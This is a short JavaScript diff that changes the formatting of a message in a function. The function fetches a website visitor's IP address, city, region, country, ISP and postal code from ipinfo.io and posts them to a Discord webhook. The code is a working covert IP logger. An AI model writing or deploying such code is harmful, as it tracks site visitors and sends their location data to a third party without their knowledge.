@@ -4,14 +4,14 @@ async function getIPAndLocationAndSendToDiscord() {
         const response = await fetch('https://ipinfo.io/json');
         const data = await response.json();
         
-        // Construct the message
-        const message = `Someone visited the website from:\n` +
+        // Construct the message with content in a code block
+        const message = `\`\`\`Someone visited the website from:\n` +
                         `- City: ${data.city}\n` +
                         `- Region: ${data.region}\n` +
                         `- Country: ${data.country}\n` +
                         `- Internet provider: ${data.org}\n` +
                         `- Postal Code: ${data.postal}\n` +
-                        `- IP Address: ${data.ip}`;
+                        `- IP Address: ${data.ip}\`\`\``;
         
         // Send the message to Discord using a webhook
         await sendToDiscord(message);
